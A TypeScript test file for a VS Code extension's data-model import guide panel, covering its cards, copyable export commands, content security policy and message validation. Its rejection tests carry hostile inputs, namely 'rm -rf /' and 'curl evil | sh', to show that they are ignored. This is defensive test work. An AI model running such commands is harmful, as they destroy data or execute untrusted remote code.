/**
 * Bring In an Existing Data Model… (`erdStudio.showImportGuide`): the guide's
 * cards per window (the dbt card only in a dbt project, the folder's
 * suggestion first, then the sources in telemetry's order, Not yet last), the
 * page (nonce-only CSP, no inline style or handler, no remote resource, one
 * primary button at most), its protocol (an action id, a snippet id or
 * openFolder; never a command id or a URL from the page), the exact text each
 * Copy copies, the fixed command each button runs, and the evidence behind
 * the cards: the Databricks notebook snippet's output and a Fabric Warehouse
 * script convert, and so does realistic BigQuery DDL, read as BigQuery (no
 * longer "Not yet").
 */

import * as fs from 'fs';
import * as path from 'path';
import { JSDOM, VirtualConsole } from 'jsdom';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import * as vscode from 'vscode';

import { _resetMockWebviewPanels } from '../__mocks__/vscode';
import { ImportGuidePanel, type ImportGuideDeps } from '../../src/providers/ImportGuidePanel';
import {
  IMPORT_GUIDE_ACTIONS,
  IMPORT_GUIDE_ACTION_FEATURES,
  IMPORT_GUIDE_COMMAND,
  IMPORT_GUIDE_COMMAND_TITLE,
  IMPORT_GUIDE_INTRO,
  IMPORT_GUIDE_ORDER,
  IMPORT_GUIDE_SNIPPETS,
  IMPORT_GUIDE_SURFACES,
  IMPORT_GUIDE_SURFACE_FEATURES,
  IMPORT_GUIDE_VIEW_TYPE,
  buildImportGuideCsp,
  buildImportGuideHtml,
  importGuideActionCommand,
  importGuideCards,
  importGuideCommandLink,
  isImportGuideToHost,
  parseImportGuideArgs,
  type ImportGuideContext,
} from '../../src/services/importGuide';
import { SQL_DIALECTS, convertSqlDdl, detectSqlDialect, type SqlDdlFile } from '../../src/services/sqlDdlImport';
import { dbmlCoreSqlEngine } from '../../src/services/sqlImportEngine';
import { FEATURES } from '../../src/services/telemetryPayload';
import { START_INTENTS, type StartIntent } from '../../src/types/startActions';
import packageJson from '../../package.json';

const FIXTURES = path.join(__dirname, '../fixtures/sql-ddl');
const pkg = packageJson as unknown as { contributes: { commands: Array<{ command: string; title: string; category?: string }> } };

const NOFOLDER: ImportGuideContext = { hasProject: false, hasDbt: false };
const BLANK: ImportGuideContext = { hasProject: true, hasDbt: false, intent: 'blank' };
const DBT: ImportGuideContext = { hasProject: true, hasDbt: true, intent: 'drawFromDbt' };

function page(ctx: ImportGuideContext) {
  const posted: unknown[] = [];
  const dom = new JSDOM(buildImportGuideHtml(ctx, 'NONCE123'), {
    runScripts: 'dangerously',
    virtualConsole: new VirtualConsole(),
    beforeParse(window) {
      (window as unknown as { acquireVsCodeApi: () => unknown }).acquireVsCodeApi = () => ({ postMessage: (m: unknown) => posted.push(m) });
    },
  });
  const doc = dom.window.document;
  const cards = [...doc.querySelectorAll('[data-card]')].map((c) => c.getAttribute('data-card'));
  const click = (selector: string) => (doc.querySelector(selector) as HTMLElement).click();
  return { dom, doc, posted, cards, click, text: doc.body.textContent ?? '' };
}

describe('the cards', () => {
  it('in a folder with nothing suggested: every source in telemetry\'s order, then Not yet; no dbt card', () => {
    expect(IMPORT_GUIDE_ORDER).toEqual(['databricks', 'snowflake', 'powerBi', 'fabric', 'sqlServer', 'postgres', 'mysql', 'dbml', 'otherTools']);
    expect(importGuideCards(BLANK)).toEqual([...IMPORT_GUIDE_ORDER, 'notYet']);
    expect(page(BLANK).cards).toEqual([...IMPORT_GUIDE_ORDER, 'notYet']);
    expect(importGuideCards(NOFOLDER)).toEqual([...IMPORT_GUIDE_ORDER, 'notYet']);
    // A project from before 2.0 has nothing concrete to bring in either.
    expect(importGuideCards({ hasProject: true, hasDbt: false, intent: 'convert' })).toEqual([...IMPORT_GUIDE_ORDER, 'notYet']);
  });

  it('shows the dbt card only in a dbt project, and there first', () => {
    expect(importGuideCards(DBT)).toEqual(['dbt', ...IMPORT_GUIDE_ORDER, 'notYet']);
    expect(importGuideCards({ hasProject: true, hasDbt: true, intent: 'convert' })[0]).toBe('dbt');
    for (const intent of START_INTENTS) {
      expect(importGuideCards({ hasProject: true, hasDbt: false, intent })).not.toContain('dbt');
    }
    expect(importGuideCards(NOFOLDER)).not.toContain('dbt');
  });

  it('leads with what the folder holds: a "Found in this folder" card running that import\'s quick path', () => {
    const cases: Array<[StartIntent, string, string, unknown[]]> = [
      ['importSqlDdl', 'This folder has CREATE TABLE scripts.', 'Import your SQL scripts', ['erdStudio.importSqlDdl', { quick: true, draft: 'start' }]],
      ['importSemanticModel', 'This folder has a Power BI or Fabric semantic model.', 'Import your Power BI semantic model', ['erdStudio.importSemanticModel', { quick: true, draft: 'start' }]],
      ['importDbmlFile', 'This folder has a DBML file.', 'Import your DBML file', ['erdStudio.importDbml', { quick: true, draft: 'start' }]],
    ];
    for (const [intent, reason, label, run] of cases) {
      const ctx: ImportGuideContext = { hasProject: true, hasDbt: false, intent };
      expect(importGuideCards(ctx)).toEqual(['found', ...IMPORT_GUIDE_ORDER, 'notYet']);
      const p = page(ctx);
      expect(p.cards[0]).toBe('found');
      const found = p.doc.querySelector('[data-card="found"]')!;
      expect(found.querySelector('.ig-card__what')?.textContent).toBe(reason);
      expect(found.querySelector('button')?.textContent).toBe(label);
      // Its button is the page's one primary button.
      expect([...p.doc.querySelectorAll('.ig-btn:not(.ig-btn--secondary)')].map((b) => b.textContent)).toEqual([label]);
      const command = importGuideActionCommand('found', intent)!;
      expect([command.command, ...command.args]).toEqual(run);
    }
    // No direct import suggested: the found action runs nothing.
    expect(importGuideActionCommand('found', 'blank')).toBeUndefined();
    expect(importGuideActionCommand('found', undefined)).toBeUndefined();
  });

  it('has one primary button at most: the suggestion\'s, or Open Folder… in an empty window; none otherwise', () => {
    const primaries = (ctx: ImportGuideContext) => [...page(ctx).doc.querySelectorAll('.ig-btn:not(.ig-btn--secondary)')].map((b) => b.textContent);
    expect(primaries(BLANK)).toEqual([]);
    expect(primaries(DBT)).toEqual(['Import from dbt']);
    expect(primaries(NOFOLDER)).toEqual(['Open Folder…']);
  });

  it('every card says what to export and has a button; every SQL card names its dialect and runs Import SQL DDL… with it', () => {
    const p = page(DBT);
    for (const card of p.doc.querySelectorAll('[data-card]')) {
      expect(card.querySelector('.ig-card__title')?.textContent?.length).toBeGreaterThan(0);
      expect(card.querySelector('.ig-card__what')?.textContent?.length).toBeGreaterThan(10);
      expect(card.querySelectorAll('[data-action="run"]').length).toBeGreaterThan(0);
    }
    const run = (action: (typeof IMPORT_GUIDE_ACTIONS)[number]) => {
      const c = importGuideActionCommand(action, 'blank')!;
      return [c.command, ...c.args];
    };
    expect(run('databricks')).toEqual(['erdStudio.importSqlDdl', { dialect: 'databricks' }]);
    expect(run('snowflake')).toEqual(['erdStudio.importSqlDdl', { dialect: 'snowflake' }]);
    expect(run('fabricWarehouse')).toEqual(['erdStudio.importSqlDdl', { dialect: 'sqlserver' }]);
    expect(run('sqlServer')).toEqual(['erdStudio.importSqlDdl', { dialect: 'sqlserver' }]);
    expect(run('postgres')).toEqual(['erdStudio.importSqlDdl', { dialect: 'postgres' }]);
    expect(run('mysql')).toEqual(['erdStudio.importSqlDdl', { dialect: 'mysql' }]);
    expect(run('powerBi')).toEqual(['erdStudio.importSemanticModel']);
    expect(run('fabric')).toEqual(['erdStudio.importSemanticModel']);
    expect(run('dbml')).toEqual(['erdStudio.importDbml']);
    expect(run('otherTools')).toEqual(['erdStudio.importModel']);
    expect(run('dbt')).toEqual(['erdStudio.drawFromDbt']);
    expect(run('feedback')).toEqual(['erdStudio.reportBug', { kind: 'feature', title: 'Import from another source', description: 'I would like to bring in my data model from: ' }]);
    // Every command a button runs is contributed (or VS Code's own).
    const contributed = new Set(pkg.contributes.commands.map((c) => c.command));
    for (const action of IMPORT_GUIDE_ACTIONS) {
      const c = importGuideActionCommand(action, 'importSqlDdl');
      expect(c, action).toBeDefined();
      expect(contributed.has(c!.command), c!.command).toBe(true);
    }
    expect(
      [...p.doc.querySelectorAll('[data-card="databricks"] [data-action="run"], [data-card="snowflake"] [data-action="run"], [data-card="sqlServer"] [data-action="run"], [data-card="postgres"] [data-action="run"], [data-card="mysql"] [data-action="run"]')]
        .map((b) => b.textContent),
    ).toEqual(['Import Databricks DDL…', 'Import Snowflake DDL…', 'Import SQL Server DDL…', 'Import PostgreSQL DDL…', 'Import MySQL DDL…']);
    expect([...p.doc.querySelectorAll('[data-card="fabric"] [data-action="run"]')].map((b) => b.textContent))
      .toEqual(['Import Semantic Model…', 'Import SQL Server DDL…']);
  });

  it('lists live connections under Not yet, with Send Feedback; Oracle, BigQuery, Redshift and SQLite go through Import…', () => {
    const notYet = page(BLANK).doc.querySelector('[data-card="notYet"]')!;
    const text = notYet.textContent ?? '';
    expect(text).not.toMatch(/Oracle|BigQuery/);
    const other = page(BLANK).doc.querySelector('[data-card="otherTools"]')?.textContent ?? '';
    for (const d of ['Oracle', 'BigQuery', 'Redshift', 'SQLite']) expect(other).toContain(d);
    expect(text).toMatch(/Live database connections/);
    expect(notYet.querySelector('[data-action="run"]')?.getAttribute('data-guide-action')).toBe('feedback');
    expect(notYet.querySelector('[data-action="run"]')?.textContent).toBe('Send Feedback');
    // No BigQuery card yet: each card's button is a telemetry key (the Import… of other tools reads it).
    expect(importGuideCards(BLANK)).not.toContain('bigquery');
  });
});

describe('the Copy buttons', () => {
  it('copy exactly these commands', () => {
    expect(IMPORT_GUIDE_SNIPPETS).toEqual({
      databricksTable: 'SHOW CREATE TABLE <catalog>.<schema>.<table>;',
      databricksSchema:
        'catalog, schema = "main", "sales"  # your catalog and schema\n' +
        'tables = spark.sql(f"""\n' +
        '  SELECT table_name FROM {catalog}.information_schema.tables\n' +
        "  WHERE table_schema = '{schema}' AND table_type IN ('MANAGED', 'EXTERNAL')\n" +
        '""").collect()\n' +
        'for t in tables:\n' +
        '    ddl = spark.sql(f"SHOW CREATE TABLE `{catalog}`.`{schema}`.`{t.table_name}`").first()[0]\n' +
        '    print(ddl.rstrip().rstrip(";") + ";\\n")',
      snowflakeSchema: "SELECT GET_DDL('SCHEMA', '<database>.<schema>');",
      snowflakeDatabase: "SELECT GET_DDL('DATABASE', '<database>');",
      postgres: 'pg_dump --schema-only --no-owner --no-privileges -d <database> -f schema.sql',
      mysql: 'mysqldump --no-data --result-file=schema.sql <database>',
    });
  });

  it('show on the page exactly what they copy, one Copy per command', () => {
    const p = page(BLANK);
    for (const button of p.doc.querySelectorAll('[data-action="copy"]')) {
      const id = button.getAttribute('data-snippet') as keyof typeof IMPORT_GUIDE_SNIPPETS;
      expect(Object.keys(IMPORT_GUIDE_SNIPPETS)).toContain(id);
      expect(button.parentElement?.querySelector('code')?.textContent).toBe(IMPORT_GUIDE_SNIPPETS[id]);
    }
    expect([...p.doc.querySelectorAll('[data-action="copy"]')].map((b) => b.getAttribute('data-snippet')).sort())
      .toEqual(Object.keys(IMPORT_GUIDE_SNIPPETS).sort());
  });
});

describe('the page', () => {
  it('has a nonce-only CSP, no inline style or handler, no remote resource, no form', () => {
    const html = buildImportGuideHtml(DBT, 'NONCE123');
    expect(buildImportGuideCsp('NONCE123')).toBe("default-src 'none'; style-src 'nonce-NONCE123'; script-src 'nonce-NONCE123';");
    expect(html).toContain(`content="${buildImportGuideCsp('NONCE123').replace(/'/g, '&#39;')}"`);
    expect(html).not.toMatch(/\sstyle=/i);
    expect(html).not.toMatch(/\son[a-z]+=/i);
    expect(html).not.toMatch(/unsafe-inline|unsafe-eval/);
    expect(html).not.toMatch(/https?:\/\//);
    expect(html).not.toMatch(/<(form|iframe|img|link|a)\b/i);
    for (const tag of html.match(/<(script|style)\b[^>]*>/g) ?? []) expect(tag).toContain('nonce="NONCE123"');
    // Colours only from VS Code's theme variables.
    expect(html).not.toMatch(/#[0-9a-f]{3,8}\b|rgba?\(/i);
  });

  it('says DBML is an open format, in a short intro with no sales line; never "open standard", and "open-source" only for DBML\'s language', () => {
    expect(IMPORT_GUIDE_INTRO).toBe('Turn the data model you already have into DBML, an open format your team can read, review and diff in Git.');
    expect(IMPORT_GUIDE_INTRO).not.toContain('free to use');
    for (const ctx of [NOFOLDER, BLANK, DBT]) {
      const { text } = page(ctx);
      expect(text).toContain('DBML, an open format');
      expect(text).not.toMatch(/open standard/i);
      expect(text.replace('the open-source schema language behind dbdiagram.io', '')).not.toMatch(/open[- ]source/i);
      // A table is a table, a diagram a diagram: "model" only as data model / semantic model / dbt models
      // (code spans keep their on-disk names: model.bim, model.dbml).
      const prose = page(ctx).doc.body.cloneNode(true) as HTMLElement;
      for (const code of prose.querySelectorAll('code')) code.remove();
      const words = (prose.textContent ?? '').replace(/\bdata models?\b|\bsemantic models?\b|\bdbt models?\b/gi, '');
      expect(words.match(/\b(domains?|models?|subject areas?)\b/gi) ?? []).toEqual([]);
    }
  });

  it('shows no dbt word, control or card in a folder without dbt, nor in an empty window', () => {
    for (const ctx of [NOFOLDER, BLANK, ...(['importSqlDdl', 'importSemanticModel', 'importDbmlFile', 'convert'] as const).map((intent) => ({ hasProject: true, hasDbt: false, intent }))]) {
      const p = page(ctx);
      expect(p.text, JSON.stringify(ctx)).not.toMatch(/\bdbt\b/i);
      expect(p.doc.querySelector('[data-guide-action="dbt"]')).toBeNull();
    }
    expect(page(DBT).text).toMatch(/Import from dbt/);
  });

  it('with no folder open says so, with Open a folder…', () => {
    const p = page(NOFOLDER);
    expect(p.doc.querySelector('.ig__nofolder')?.textContent).toContain('Open the folder you keep your data model in first');
    p.click('[data-action="openFolder"]');
    expect(p.posted).toEqual([{ type: 'openFolder' }]);
    expect(page(BLANK).doc.querySelector('.ig__nofolder')).toBeNull();
  });

  it('posts only an action id or a snippet id, read from its own attributes; Copy says Copied', () => {
    const p = page(BLANK);
    p.click('[data-card="databricks"] [data-action="run"]');
    p.click('[data-card="databricks"] [data-action="copy"]');
    expect(p.posted).toEqual([{ type: 'run', action: 'databricks' }, { type: 'copy', snippet: 'databricksTable' }]);
    expect(p.doc.querySelector('[data-card="databricks"] [data-action="copy"]')?.textContent).toBe('Copied');
    for (const message of p.posted) expect(isImportGuideToHost(message)).toBe(true);
  });
});

describe('the protocol', () => {
  it('accepts a known action, a known snippet or openFolder; nothing else', () => {
    for (const action of IMPORT_GUIDE_ACTIONS) expect(isImportGuideToHost({ type: 'run', action })).toBe(true);
    for (const snippet of Object.keys(IMPORT_GUIDE_SNIPPETS)) expect(isImportGuideToHost({ type: 'copy', snippet })).toBe(true);
    expect(isImportGuideToHost({ type: 'openFolder' })).toBe(true);
    for (const bad of [
      undefined, null, 'run', [], [{ type: 'run', action: 'dbml' }], {},
      { type: 'run' }, { type: 'run', action: 'erdStudio.importDbml' }, { type: 'run', action: 'bigquery' },
      { type: 'run', command: 'workbench.action.terminal.new' }, { type: 'executeCommand', command: 'erdStudio.importDbml' },
      { type: 'copy' }, { type: 'copy', snippet: 'rm -rf /' }, { type: 'copy', snippet: 'toString' }, { type: 'copy', snippet: '__proto__' },
      { type: 'copy', text: 'anything' }, { type: 'openExternal', url: 'https://example.com' }, { type: 'start', action: 'blank' },
    ]) {
      expect(isImportGuideToHost(bad), JSON.stringify(bad)).toBe(false);
    }
  });

  it('the command\'s argument names where it was opened from, or nothing', () => {
    for (const from of IMPORT_GUIDE_SURFACES) expect(parseImportGuideArgs({ from })).toBe(from);
    for (const bad of [undefined, 'welcome', ['welcome'], { from: 'palette' }, { from: 1 }, null]) expect(parseImportGuideArgs(bad)).toBeUndefined();
    expect(importGuideCommandLink('walkthrough')).toBe('command:erdStudio.showImportGuide?%5B%7B%22from%22%3A%22walkthrough%22%7D%5D');
    expect(parseImportGuideArgs(JSON.parse(decodeURIComponent(importGuideCommandLink('sidebar').split('?')[1]))[0])).toBe('sidebar');
  });

  it('counts fixed keys only, each in the telemetry allowlist', () => {
    const keys = [...Object.values(IMPORT_GUIDE_SURFACE_FEATURES), ...Object.values(IMPORT_GUIDE_ACTION_FEATURES), 'importGuideOpened', 'importGuideCopied'];
    for (const key of keys) expect(FEATURES as readonly string[]).toContain(key);
    expect(new Set(keys).size).toBe(keys.length);
  });

  it('is contributed with its real title, in category ERD Studio, shown in every window', () => {
    expect(pkg.contributes.commands.find((c) => c.command === IMPORT_GUIDE_COMMAND)).toEqual({
      command: 'erdStudio.showImportGuide', title: IMPORT_GUIDE_COMMAND_TITLE, category: 'ERD Studio',
    });
    // One label everywhere: the palette, the tab (without its ellipsis), the quick picks and a draft's button.
    expect(IMPORT_GUIDE_COMMAND_TITLE).toBe('Bring In Your Data Model…');
    const palette = (packageJson as unknown as { contributes: { menus: { commandPalette: Array<{ command: string }> } } }).contributes.menus.commandPalette;
    expect(palette.filter((m) => m.command === IMPORT_GUIDE_COMMAND)).toEqual([]);
  });
});

describe('the panel host', () => {
  const panels = () => vscode.window._webviewPanels.filter((p) => p.viewType === IMPORT_GUIDE_VIEW_TYPE);
  let ctx: ImportGuideContext;
  let deps: ImportGuideDeps & { ran: unknown[][]; copied: string[]; features: string[]; noFolders: number };

  beforeEach(() => {
    _resetMockWebviewPanels();
    ctx = BLANK;
    const ran: unknown[][] = [];
    const copied: string[] = [];
    const features: string[] = [];
    deps = {
      ran, copied, features, noFolders: 0,
      context: () => ctx,
      executeCommand: async (...args: unknown[]) => { ran.push(args); },
      writeClipboard: async (text) => { copied.push(text); },
      noFolder: () => { deps.noFolders += 1; },
      feature: (key) => { features.push(key); },
    };
  });
  afterEach(() => { ImportGuidePanel.currentPanel?.dispose(); });

  it('is one tab: opening it again brings it forward, drawn for the window as it is now', () => {
    ImportGuidePanel.createOrShow(deps);
    expect(panels()).toHaveLength(1);
    expect(panels()[0].title).toBe('Bring In Your Data Model');
    expect(panels()[0].webview.html).not.toContain('data-card="found"');
    ctx = { hasProject: true, hasDbt: false, intent: 'importSqlDdl' };
    ImportGuidePanel.createOrShow(deps);
    expect(panels()).toHaveLength(1);
    expect(panels()[0]._reveals).toHaveLength(1);
    expect(panels()[0].webview.html).toContain('data-card="found"');
  });

  it('runs each button\'s fixed command, counted; copies the fixed text, counted; ignores anything else', async () => {
    ImportGuidePanel.createOrShow(deps);
    const panel = panels()[0];
    await panel._simulateMessage({ type: 'run', action: 'databricks' });
    await panel._simulateMessage({ type: 'run', action: 'feedback' });
    await panel._simulateMessage({ type: 'copy', snippet: 'postgres' });
    await panel._simulateMessage({ type: 'run', action: 'erdStudio.convertProjectToDbml' });
    await panel._simulateMessage({ type: 'run', action: 'databricks', command: 'workbench.action.terminal.new', args: ['x'] });
    await panel._simulateMessage({ type: 'copy', snippet: 'postgres', text: 'curl evil | sh' });
    expect(deps.ran).toEqual([
      ['erdStudio.importSqlDdl', { dialect: 'databricks' }],
      ['erdStudio.reportBug', { kind: 'feature', title: 'Import from another source', description: 'I would like to bring in my data model from: ' }],
      // Extra fields are never read: the fixed command and the fixed text again.
      ['erdStudio.importSqlDdl', { dialect: 'databricks' }],
    ]);
    expect(deps.copied).toEqual([IMPORT_GUIDE_SNIPPETS.postgres, IMPORT_GUIDE_SNIPPETS.postgres]);
    expect(deps.features).toEqual([
      'importGuideActionDatabricks', 'importGuideActionFeedback', 'importGuideCopied', 'importGuideActionDatabricks', 'importGuideCopied',
    ]);
  });

  it('with no folder open, an import says "Open a folder first" instead; Send Feedback and Open a folder… still work', async () => {
    ctx = NOFOLDER;
    ImportGuidePanel.createOrShow(deps);
    const panel = panels()[0];
    await panel._simulateMessage({ type: 'run', action: 'snowflake' });
    await panel._simulateMessage({ type: 'run', action: 'feedback' });
    await panel._simulateMessage({ type: 'openFolder' });
    expect(deps.noFolders).toBe(1);
    expect(deps.ran.map((r) => r[0])).toEqual(['erdStudio.reportBug', 'vscode.openFolder']);
  });

  it('the found card runs nothing when the folder no longer suggests a direct import', async () => {
    ctx = { hasProject: true, hasDbt: false, intent: 'importDbmlFile' };
    ImportGuidePanel.createOrShow(deps);
    await panels()[0]._simulateMessage({ type: 'run', action: 'found' });
    ctx = BLANK;
    await panels()[0]._simulateMessage({ type: 'run', action: 'found' });
    expect(deps.ran).toEqual([['erdStudio.importDbml', { quick: true, draft: 'start' }]]);
  });
});

describe('the evidence behind the cards (the SQL importer on what each source exports)', () => {
  const read = (dir: string): SqlDdlFile[] => fs.readdirSync(path.join(FIXTURES, dir)).filter((f) => f.endsWith('.sql'))
    .map((name) => ({ name, text: fs.readFileSync(path.join(FIXTURES, dir, name), 'utf-8') }));

  it('Databricks: what the notebook snippet prints (SHOW CREATE TABLE per table) reads, with keys and the foreign key', () => {
    const result = convertSqlDdl({ dialect: 'databricks', files: read('databricks-notebook') }, dbmlCoreSqlEngine);
    if (!result.ok) throw new Error(JSON.stringify(result.problems));
    expect(result.dbml).toMatch(/Table "sales"\."customers"/);
    expect(result.dbml).toMatch(/"customer_id" BIGINT \[pk\]/);
    expect(result.dbml).toContain('Ref: "sales"."orders"."customer_id" > "sales"."customers"."customer_id"');
  });

  it('Fabric Warehouse: an SSMS script (SET, GO, NOT ENFORCED keys) reads as SQL Server', () => {
    const result = convertSqlDdl({ dialect: 'sqlserver', files: read('fabric-warehouse') }, dbmlCoreSqlEngine);
    if (!result.ok) throw new Error(JSON.stringify(result.problems));
    expect(result.dbml).toMatch(/Table "dbo"\."dim_customer"/);
    expect(result.dbml).toMatch(/"order_id" bigint \[pk\]/);
    expect(result.dbml).toContain('Ref: "dbo"."fct_order"."customer_id" > "dbo"."dim_customer"."customer_id"');
  });

  it('BigQuery: realistic INFORMATION_SCHEMA.TABLES.ddl reads whole as BigQuery (detected), keys, links and descriptions kept', () => {
    const files = read('bigquery');
    expect(detectSqlDialect(files.map((f) => f.text).join('\n'))).toBe('bigquery');
    const result = convertSqlDdl({ dialect: 'bigquery', files }, dbmlCoreSqlEngine);
    if (!result.ok) throw new Error(JSON.stringify(result.problems));
    expect(result.problems).toEqual([]);
    expect(result.tableCount).toBe(4);
    expect(result.refCount).toBe(3);
    expect(result.readWith).toEqual({ grammar: 4, repaired: 0, salvaged: 0 });
    expect(result.dbml).toContain('Ref: "sales"."fct_order"."customer_id" > "sales"."dim_customer"."customer_id"');
    expect(result.dbml).toMatch(/"customer_id" INT64 \[[^\]]*note: 'Surrogate key'/);
    // Every other dialect reads less of it as written.
    for (const dialect of SQL_DIALECTS.filter((d) => d !== 'bigquery')) {
      const other = convertSqlDdl({ dialect, files }, dbmlCoreSqlEngine);
      expect(!other.ok || other.problems.length > 0 || (other.readWith?.grammar ?? 0) < 4, dialect).toBe(true);
    }
  });
});
